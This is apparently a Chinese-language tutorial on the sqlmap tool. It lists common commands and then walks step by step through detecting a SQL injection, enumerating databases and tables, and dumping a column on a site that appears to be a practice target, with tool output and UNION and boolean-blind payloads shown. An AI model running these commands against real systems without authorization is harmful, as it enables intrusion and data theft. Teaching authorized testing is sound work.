

https://github.com/sqlmapproject/sqlmap

git clone https://github.com/sqlmapproject/sqlmap.git



常用命令：

``` sh
# 检查注入点 
sqlmap -u "http://ooxx.com/a.php?id=1" 
# 列数据库信息 
sqlmap -u "http://ooxx.com/a.php?id=1" --dbs 
# 指定数据库名列出所有表 
sqlmap -u "http://ooxx.com/a.php?id=1" -D dbsname --tables 
# 指定数据库名表名列出所有字段 
sqlmap -u "http://ooxx.com/a.php?id=1" -D dbsname -T tablename --columns 
# 指定数据库名表名字段dump出指定字段 
sqlmap -u "http://ooxx.com/a.php?id=1" -D dbsname -T tablename -C columnname --dump 
# cookie 注入.在需要登录的地方，需要登录后的cookie 
--cookie=COOKIE                 
# 执行指定的 SQL 语句 
--sql-query=QUERY 
# 代理注入 
--proxy="http://127.0.0.1:8087"
```



--data "{sqlExp:'123123123123123,*'}"

### 检查注入点

``` sh
 python sqlmap.py -u https://rimovni.exeye.run/kanwaki/diary?id=1
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.7.20#dev}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

...
[14:48:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[14:48:51] [INFO] automatically extending ranges for UNION query injection techn there is at least one other (potential) technique found
[14:48:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce ed to find the right number of query columns. Automatically extending the range NION query injection technique test
[14:49:02] [INFO] target URL appears to have 2 columns in query
[14:49:27] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 coable
[14:49:27] [WARNING] applying generic concatenation (CONCAT)
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any
sqlmap identified the following injection point(s) with a total of 98 HTTP(s) re
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 7742=7742

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=1 UNION ALL SELECT CONCAT(0x71627a7a71,0x46437a6d435a536a6e564c4714468414b715568764979457641496c70526f625679,0x717a767871),NULL-- -
---
[14:49:29] [INFO] testing MySQL
[14:49:30] [INFO] confirming MySQL
[14:49:32] [INFO] the back-end DBMS is MySQL
web application technology: OpenResty 1.15.8.2
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[14:49:34] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 54 times
[14:49:34] [INFO] fetched data logged to text files under 'C:\Users\wy\AppData\Lutput\rimovni.exeye.run'

[*] ending @ 14:49:34 /2020-09-24/

```

可以看到通过id 获取到了注入点



### 列出数据库

``` sh
$ python sqlmap.py -u "https://rimovni.exeye.run/kanwaki/diary?id=1" --dbs
....
[14:54:05] [INFO] the back-end DBMS is MySQL
web application technology: OpenResty 1.15.8.2
back-end DBMS: MySQL 5 (MariaDB fork)
[14:54:05] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] twosecu1_vuln_02

```

可见有两个库： information_schema 和 twosecu1_vuln_02



### 列出数据表

指定数据库名列出所有表·`sqlmap -u "http://ooxx.com/a.php?id=1" -D 数据库名 --tables `

``` python
$ python sqlmap.py -u "https://rimovni.exeye.run/kanwaki/diary?id=1" -D twosecu1_vuln_02 --tables
....
[15:00:14] [INFO] the back-end DBMS is MySQL
web application technology: OpenResty 1.15.8.2
back-end DBMS: MySQL 5 (MariaDB fork)
[15:00:14] [INFO] fetching tables for database: 'twosecu1_vuln_02'
Database: twosecu1_vuln_02
[2 tables]
+--------+
| book   |
| hacker |
+--------+
```



### 列出字段

指定数据库名表名列出所有字段 sqlmap -u "http://ooxx.com/a.php?id=1" -D dbsname -T tablename --columns

``` sh
python sqlmap.py -u "https://rimovni.exeye.run/kanwaki/diary?id=1" -D twosecu1_vuln_02 -T book --columns
...
Database: twosecu1_vuln_02
Table: book
[2 columns]
+--------+---------------+
| Column | Type          |
+--------+---------------+
| diary  | varchar(2000) |
| id     | int(11)       |
+--------+---------------+
```



### 爆破字段

指定数据库名表名字段dump出指定字段 sqlmap -u "http://ooxx.com/a.php?id=1" -D dbsname -T tablename -C columnname --dump


``` sh
$ python sqlmap.py -u "https://rimovni.exeye.run/kanwaki/diary?id=1" -D twosecu1_vuln_02 -T hacker -C diary --dump
...
[15:08:35] [INFO] the back-end DBMS is MySQL
web application technology: OpenResty 1.15.8.2
back-end DBMS: MySQL 5 (MariaDB fork)
[15:08:35] [INFO] fetching entries of column(s) 'diary' for table 'hacker' in database 'twosecu1_vuln_02'
Database: twosecu1_vuln_02
Table: hacker
... 字段内容 .. 
```



